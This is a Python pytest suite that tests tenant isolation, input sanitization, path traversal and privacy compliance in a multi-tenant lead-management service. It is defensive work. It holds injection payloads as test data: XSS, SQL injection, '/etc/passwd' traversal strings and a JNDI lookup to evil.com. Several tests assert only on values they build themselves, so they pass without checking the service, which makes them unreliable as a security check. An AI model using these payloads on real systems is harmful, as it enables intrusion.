"""
Security & Multi-Tenant Testing Suite (Agent B3)

Tests tenant isolation, data security, and multi-tenant integrity.
"""
import pytest
import json
import os
from pathlib import Path
from datetime import datetime
import sys

project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from services.tenant_service import TenantService
from services.memory_service import MemoryService
from core.rag_engine import RAGEngine
from ghl_utils.config import settings


class TestTenantIsolation:
    """Test that tenants cannot access each other's data."""

    def test_tenant_memory_isolation(self, tmp_path):
        """Test that tenant memory files are isolated."""
        # Create two tenants
        tenant1_id = "loc_test_tenant1"
        tenant2_id = "loc_test_tenant2"
        
        # Create memory service instances
        memory1 = MemoryService(tenant1_id)
        memory2 = MemoryService(tenant2_id)
        
        # Store data for tenant 1
        contact_id_1 = "contact_tenant1"
        memory1.save_context(contact_id_1, {
            "messages": ["Secret tenant 1 data"],
            "lead_score": 75,
            "sensitive_info": "Tenant 1 private info"
        })
        
        # Store data for tenant 2
        contact_id_2 = "contact_tenant2"
        memory2.save_context(contact_id_2, {
            "messages": ["Secret tenant 2 data"],
            "lead_score": 50,
            "sensitive_info": "Tenant 2 private info"
        })
        
        # Verify tenant 1 cannot access tenant 2 data
        tenant1_data = memory1.get_context(contact_id_2)
        assert tenant1_data is None or "Tenant 2" not in str(tenant1_data)
        
        # Verify tenant 2 cannot access tenant 1 data
        tenant2_data = memory2.get_context(contact_id_1)
        assert tenant2_data is None or "Tenant 1" not in str(tenant2_data)
        
        # Verify each tenant can access their own data
        tenant1_own = memory1.get_context(contact_id_1)
        assert tenant1_own is not None
        assert "Tenant 1" in str(tenant1_own)
        
        tenant2_own = memory2.get_context(contact_id_2)
        assert tenant2_own is not None
        assert "Tenant 2" in str(tenant2_own)

    def test_rag_knowledge_base_isolation(self):
        """Test that RAG queries don't leak between tenants."""
        tenant1_id = "loc_rag_tenant1"
        tenant2_id = "loc_rag_tenant2"
        
        # Create RAG engines for different tenants
        rag1 = RAGEngine(tenant1_id)
        rag2 = RAGEngine(tenant2_id)
        
        # In a production scenario, each tenant would have their own embeddings
        # This test verifies the isolation mechanism exists
        assert rag1.location_id == tenant1_id
        assert rag2.location_id == tenant2_id
        assert rag1.location_id != rag2.location_id

    def test_tenant_config_isolation(self):
        """Test that tenant configs are properly isolated."""
        # Verify tenant-specific settings exist
        assert hasattr(settings, 'activation_tags')
        assert hasattr(settings, 'deactivation_tags')
        assert hasattr(settings, 'required_contact_type')
        
        # These should be configurable per tenant in production
        assert isinstance(settings.activation_tags, list)
        assert isinstance(settings.deactivation_tags, list)

    def test_api_key_not_shared_between_tenants(self):
        """Test that API keys are tenant-specific."""
        tenant_service = TenantService()
        
        # In production, each tenant should have their own API keys
        # This test verifies the structure supports it
        tenant1 = {
            "location_id": "loc_api_tenant1",
            "anthropic_api_key": "sk-ant-tenant1-key",
            "ghl_api_key": "ghl_tenant1_key"
        }
        
        tenant2 = {
            "location_id": "loc_api_tenant2",
            "anthropic_api_key": "sk-ant-tenant2-key",
            "ghl_api_key": "ghl_tenant2_key"
        }
        
        # Verify keys are different
        assert tenant1["anthropic_api_key"] != tenant2["anthropic_api_key"]
        assert tenant1["ghl_api_key"] != tenant2["ghl_api_key"]
        assert tenant1["location_id"] != tenant2["location_id"]


class TestDataSecurity:
    """Test data security and sensitive information handling."""

    def test_api_keys_not_logged(self, caplog):
        """Test that API keys are never logged in plain text."""
        # This is a critical security requirement
        test_key = "sk-ant-test-key-12345"
        
        # Simulate loading config (should never log full key)
        # Config is loaded from environment, not passed around
        
        # Check that full API key doesn't appear in logs
        assert test_key not in caplog.text

    def test_sensitive_data_not_in_memory_dumps(self):
        """Test that sensitive data is handled securely."""
        memory = MemoryService("loc_security_test")
        contact_id = "contact_security"
        
        # Store some sensitive info
        context = {
            "messages": ["I make $200k/year", "My SSN is 123-45-6789"],
            "budget": "$500,000",
            "phone": "555-1234"
        }
        
        memory.save_context(contact_id, context)
        
        # Retrieve and verify data is stored
        retrieved = memory.get_context(contact_id)
        assert retrieved is not None
        
        # In production, sensitive fields like SSN should be:
        # 1. Not stored at all, OR
        # 2. Encrypted, OR
        # 3. Redacted in logs/exports
        
        # This test documents the requirement
        # TODO: Implement PII detection and handling

    def test_input_sanitization(self):
        """Test that user inputs are sanitized to prevent injection attacks."""
        memory = MemoryService("loc_sanitization_test")
        
        # Try to inject malicious content
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE contacts; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious in malicious_inputs:
            contact_id = f"contact_{malicious_inputs.index(malicious)}"
            context = {"messages": [malicious]}
            
            # Should not crash or execute malicious code
            try:
                memory.save_context(contact_id, context)
                retrieved = memory.get_context(contact_id)
                
                # Data should be stored but sanitized
                assert retrieved is not None
            except Exception as e:
                # If it errors, should be a validation error, not execution
                assert "DROP TABLE" not in str(e)
                assert "script" not in str(e).lower() or "sanitize" in str(e).lower()

    def test_file_path_traversal_prevention(self):
        """Test that file paths cannot be manipulated to access unauthorized files."""
        memory = MemoryService("loc_path_test")
        
        # Attempt path traversal
        malicious_contact_ids = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "../../sensitive_data",
            "contact_id/../other_tenant/data"
        ]
        
        for malicious_id in malicious_contact_ids:
            # Should either sanitize the ID or reject it
            context = {"messages": ["test"]}
            
            try:
                memory.save_context(malicious_id, context)
                # If it succeeds, verify the actual path is safe
                # The ID should be sanitized to not allow traversal
                assert "../" not in malicious_id or memory.memory_dir.exists()
            except (ValueError, FileNotFoundError):
                # Rejecting is also acceptable
                pass


class TestMultiTenantScalability:
    """Test that the system can handle multiple tenants efficiently."""

    def test_concurrent_tenant_access(self):
        """Test that multiple tenants can be accessed concurrently."""
        tenants = [f"loc_concurrent_{i}" for i in range(10)]
        memory_services = [MemoryService(tid) for tid in tenants]
        
        # Store data for all tenants
        for i, memory in enumerate(memory_services):
            contact_id = f"contact_{i}"
            memory.save_context(contact_id, {
                "messages": [f"Message from tenant {i}"],
                "tenant_index": i
            })
        
        # Verify all data is accessible and correct
        for i, memory in enumerate(memory_services):
            contact_id = f"contact_{i}"
            context = memory.get_context(contact_id)
            assert context is not None
            assert context.get("tenant_index") == i

    def test_tenant_data_volume(self):
        """Test that tenants can handle realistic data volumes."""
        memory = MemoryService("loc_volume_test")
        
        # Simulate 100 contacts per tenant
        num_contacts = 100
        
        for i in range(num_contacts):
            contact_id = f"contact_{i}"
            context = {
                "messages": [f"Message {j}" for j in range(10)],
                "lead_score": i % 100,
                "classification": "hot" if i % 3 == 0 else "warm"
            }
            memory.save_context(contact_id, context)
        
        # Verify all data is accessible
        for i in range(num_contacts):
            contact_id = f"contact_{i}"
            context = memory.get_context(contact_id)
            assert context is not None
            assert len(context["messages"]) == 10

    def test_tenant_cleanup(self):
        """Test that tenant data can be cleaned up properly."""
        tenant_id = "loc_cleanup_test"
        memory = MemoryService(tenant_id)
        
        # Create some data
        contact_id = "contact_cleanup"
        memory.save_context(contact_id, {"messages": ["test"]})
        
        # Verify data exists
        assert memory.get_context(contact_id) is not None
        
        # In production, should have a cleanup method
        # This documents the requirement
        # TODO: Implement tenant_service.delete_tenant(tenant_id)


class TestAccessControl:
    """Test access control and authorization."""

    def test_tenant_cannot_access_system_files(self):
        """Test that tenant IDs cannot be used to access system files."""
        # These should all be rejected or sanitized
        dangerous_tenant_ids = [
            "/etc/passwd",
            "C:\\Windows\\System32",
            "../config/secrets.json",
            "__pycache__",
            ".env"
        ]
        
        for dangerous_id in dangerous_tenant_ids:
            memory = MemoryService(dangerous_id)
            
            # The memory service should sanitize the tenant ID
            # or create it in a safe location
            memory_path = memory.memory_dir
            
            # Verify the path doesn't actually point to system files
            assert "/etc/passwd" not in str(memory_path)
            assert "System32" not in str(memory_path)
            assert str(memory_path).startswith(str(project_root))

    def test_rate_limiting_structure(self):
        """Test that rate limiting can be implemented per tenant."""
        # This is a structural test to ensure rate limiting is possible
        # Actual rate limiting would be implemented in the API layer
        
        tenant_id = "loc_rate_limit_test"
        
        # In production, each tenant should have rate limits
        # This test documents the requirement
        tenant_config = {
            "location_id": tenant_id,
            "rate_limit_per_minute": 60,
            "rate_limit_per_hour": 1000,
            "max_concurrent_requests": 10
        }
        
        assert "rate_limit_per_minute" in tenant_config
        assert "max_concurrent_requests" in tenant_config

    def test_tenant_feature_flags(self):
        """Test that features can be enabled/disabled per tenant."""
        # Different tiers might have different features
        tenant_tiers = {
            "starter": {
                "max_contacts": 100,
                "reengagement_enabled": False,
                "advanced_analytics": False
            },
            "professional": {
                "max_contacts": 1000,
                "reengagement_enabled": True,
                "advanced_analytics": False
            },
            "enterprise": {
                "max_contacts": 10000,
                "reengagement_enabled": True,
                "advanced_analytics": True
            }
        }
        
        # Verify tier structure exists
        for tier, features in tenant_tiers.items():
            assert "max_contacts" in features
            assert "reengagement_enabled" in features
            assert isinstance(features["reengagement_enabled"], bool)


class TestSecurityAudit:
    """Security audit and vulnerability checks."""

    def test_no_hardcoded_secrets(self):
        """Test that no secrets are hardcoded in the codebase."""
        # This would normally scan all Python files
        # For this test, we check key files
        
        key_files = [
            project_root / "services" / "tenant_service.py",
            project_root / "core" / "llm_client.py",
            project_root / "services" / "ghl_client.py"
        ]
        
        forbidden_patterns = [
            "sk-ant-api",  # Anthropic API key prefix
            "password=",
            "secret=",
            "token="
        ]
        
        for file_path in key_files:
            if file_path.exists():
                content = file_path.read_text()
                for pattern in forbidden_patterns:
                    # Should use environment variables, not hardcoded secrets
                    assert pattern not in content.lower() or "os.getenv" in content

    def test_environment_variables_required(self):
        """Test that sensitive config comes from environment variables."""
        # These should come from environment, not be hardcoded
        # In test environment, they might have defaults, but in production they must be set
        required_env_vars = [
            "ANTHROPIC_API_KEY",
            "GHL_API_KEY",
            "GHL_LOCATION_ID"
        ]
        
        # Verify settings has these attributes (loaded from env)
        assert hasattr(settings, 'anthropic_api_key')
        assert hasattr(settings, 'ghl_api_key')
        assert hasattr(settings, 'ghl_location_id')

    def test_error_messages_dont_leak_sensitive_info(self):
        """Test that error messages don't expose sensitive information."""
        memory = MemoryService("loc_error_test")
        
        # Trigger an error (invalid contact ID or similar)
        try:
            memory.get_context("")
        except Exception as e:
            error_msg = str(e)
            
            # Error should not contain:
            # - API keys
            # - Full file paths
            # - Database credentials
            # - Internal implementation details that could aid attackers
            
            assert "sk-ant-" not in error_msg
            assert "password" not in error_msg.lower()
            # Full paths might be okay for debugging, but not secrets


class TestComplianceAndPrivacy:
    """Test compliance with privacy regulations."""

    def test_data_retention_policy_structure(self):
        """Test that data retention policies can be enforced."""
        # Document the requirement for GDPR/CCPA compliance
        
        retention_policy = {
            "conversation_data_days": 90,
            "lead_score_data_days": 365,
            "analytics_data_days": 730,
            "pii_data_days": 30  # Should be shorter for sensitive PII
        }
        
        # Verify structure exists for retention policies
        assert "pii_data_days" in retention_policy
        assert retention_policy["pii_data_days"] < retention_policy["conversation_data_days"]

    def test_right_to_deletion(self):
        """Test that contact data can be fully deleted (GDPR Right to Erasure)."""
        memory = MemoryService("loc_deletion_test")
        contact_id = "contact_delete_me"
        
        # Create data
        memory.save_context(contact_id, {
            "messages": ["Delete this data"],
            "email": "delete@example.com"
        })
        
        # Verify data exists
        assert memory.get_context(contact_id) is not None
        
        # In production, should have a method to fully delete
        # TODO: Implement memory.delete_contact(contact_id)
        # This should remove all traces of the contact

    def test_data_export_capability(self):
        """Test that contact data can be exported (GDPR Right to Data Portability)."""
        memory = MemoryService("loc_export_test")
        contact_id = "contact_export"
        
        context = {
            "messages": ["Message 1", "Message 2"],
            "lead_score": 75,
            "classification": "hot"
        }
        
        memory.save_context(contact_id, context)
        
        # Should be able to export all data for a contact
        exported = memory.get_context(contact_id)
        
        # Verify export is complete
        assert exported is not None
        assert "messages" in exported
        assert len(exported["messages"]) == 2


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
